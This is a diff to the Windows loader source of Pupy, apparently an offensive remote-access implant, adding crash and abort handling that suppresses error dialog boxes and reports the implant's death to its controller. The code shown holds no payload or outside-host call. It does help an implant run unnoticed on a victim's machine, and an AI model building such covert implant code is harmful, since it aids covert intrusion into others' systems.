@@ -4,6 +4,7 @@
 */
 
 #include <windows.h>
+#include <signal.h>
 
 #include "revision.h"
 #include "pupy_load.h"
@@ -34,6 +35,12 @@ static BOOL on_exit_session_called = FALSE;
 typedef LPWSTR* (*CommandLineToArgvW_t)(
     LPCWSTR lpCmdLine,
     int     *pNumArgs
+);
+
+typedef VOID (*__p_set_abort_behavior_t)(DWORD, DWORD);
+typedef VOID (__cdecl *signal_t) (
+    int sig,
+    void (__cdecl *func ) (int)
 );
 
 
@@ -183,6 +190,33 @@ static const PSTR Kernel32AllowedPrefixes[] = {
 };
 #endif
 
+static
+LONG WINAPI OnThreadCrash(PVOID ExceptionInfo) {
+    LONG lVerdict = Postmortem(ExceptionInfo);
+
+    if (on_exit_session_cb && !on_exit_session_called) {
+        dprint("Try to notify about client death\n");
+
+        on_exit_session_called = TRUE;
+        on_exit_session_cb();
+
+        dprint("Try to notify about client death - done\n");
+    }
+
+    return lVerdict;
+}
+
+void OnAbortHandler(int signum)
+{
+    dprint("Get abort() exception!\n");
+    RaiseException(
+        EXCEPTION_NONCONTINUABLE_EXCEPTION,
+        0,
+        0,
+        NULL
+    );
+}
+
 void initialize(BOOL isDll) {
     int i, argc = 0;
     char **argv = NULL;
@@ -279,17 +313,58 @@ void initialize(BOOL isDll) {
         return;
     }
 
+    {
+        DWORD dwOldErrorMode = SetErrorMode(
+            SEM_FAILCRITICALERRORS |
+                SEM_NOGPFAULTERRORBOX |
+                SEM_NOALIGNMENTFAULTEXCEPT |
+                SEM_NOGPFAULTERRORBOX |
+                SEM_NOOPENFILEERRORBOX
+        );
+
+        dprint("Old error mode: %08x\n", dwOldErrorMode);
+    }
+
+    signal(SIGABRT, OnAbortHandler);
+
+    _set_abort_behavior(0, _WRITE_ABORT_MSG);
+
+    {
+        HMODULE hMSVCR90 = MyGetModuleHandleA("MSVCR90");
+        if (hMSVCR90) {
+            __p_set_abort_behavior_t __p_set_abort_behavior = (__p_set_abort_behavior_t)
+                MyGetProcAddress(hMSVCR90, "_set_abort_behavior");
+
+            signal_t __p_signal = (signal_t) MyGetProcAddress(hMSVCR90, "signal");
+
+            if (__p_set_abort_behavior) {
+                __p_set_abort_behavior(0, _WRITE_ABORT_MSG);
+                dprint("_set_abort_behavior/MSVCR90 - default abort() handlers removed\n");
+            } else {
+                dprint("_set_abort_behavior/MSVCR90 - _set_abort_behavior was not found\n");
+            }
+
+            if (__p_signal) {
+                __p_signal(SIGABRT, OnAbortHandler);
+                dprint("signal/MSVCR90 - set sigabrt handler\n");
+            } else {
+                dprint("signal/MSVCR90 - signal was not found\n");
+            }
+        } else {
+            dprint("_set_abort_behavior/MSVCR90 - DLL was not loaded\n");
+        }
+    }
+
 #ifdef POSTMORTEM
-    _set_abort_behavior(2, 0xF);
+    EnableCrashingOnCrashes();
+
     if (isDll) {
         dprint("Postmortem - enable per-thread handlers\n");
-        MySetUnhandledExceptionFilter(Postmortem);
+        MySetUnhandledExceptionFilter(NULL, OnThreadCrash);
     } else {
         dprint("Postmortem - set global handler\n");
-        SetUnhandledExceptionFilter(Postmortem);
+        SetUnhandledExceptionFilter(OnThreadCrash);
     }
-#else
-    _set_abort_behavior(0, 0);
 #endif
 
 #ifdef _PUPY_DYNLOAD
@@ -393,15 +468,16 @@ static LONG PostmortemFilter(int code, PEXCEPTION_POINTERS pExceptionInfo) {
 
 DWORD WINAPI _run_pupy_thread(LPVOID lpArg)
 {
-    dprint("Pupy worker started\n");
 #ifdef POSTMORTEM
     __try {
+        dprint("Pupy worker started [Postmortem enabled]\n");
         run_pupy();
     }
     __except(PostmortemFilter(GetExceptionCode(), GetExceptionInformation())) {
         dprint("Fatal error at main thread\n");
     }
 #else
+    dprint("Pupy worker started [Postmortem disabled]\n");
     run_pupy();
 #endif
     dprint("Pupy worker exited\n");
